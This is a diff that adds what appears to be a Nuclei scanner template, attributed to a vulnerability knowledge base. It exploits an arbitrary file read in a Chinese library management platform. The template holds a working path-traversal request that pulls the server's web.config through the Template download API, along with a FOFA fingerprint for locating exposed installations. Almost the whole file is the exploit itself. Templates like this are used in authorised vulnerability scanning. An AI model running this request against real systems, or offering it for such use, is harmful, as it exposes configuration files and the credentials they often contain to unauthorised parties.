@@ -1,0 +1,55 @@
+id: poc-kxeo2dmroge6w03q
+info:
+  name: 图书馆管理平台Template存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kxeo2dmroge6w03q'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kxeo2dmroge6w03q
+    fofa: '"static_home/dll.vendor.js"'
+http:
+- raw:
+  - 'GET /Api/Lib/Download/Template?fileName=Template/../../../web.config HTTP/2
+
+    Host: {{Hostname}}
+
+    Cookie: Hm_lvt_2de16be8e38d12d149757d4984d8dc9a=1734416053; HMACCOUNT=F3A0D49D22D0A4BB; Hm_lpvt_2de16be8e38d12d149757d4984d8dc9a=1734416054
+
+    Cache-Control: max-age=0
+
+    Sec-Ch-Ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-User: ?1
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    If-None-Match: "ab432327b7e4da1:0"
+
+    If-Modified-Since: Fri, 02 Aug 2024 08:37:04 GMT
+
+    Priority: u=0, i'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
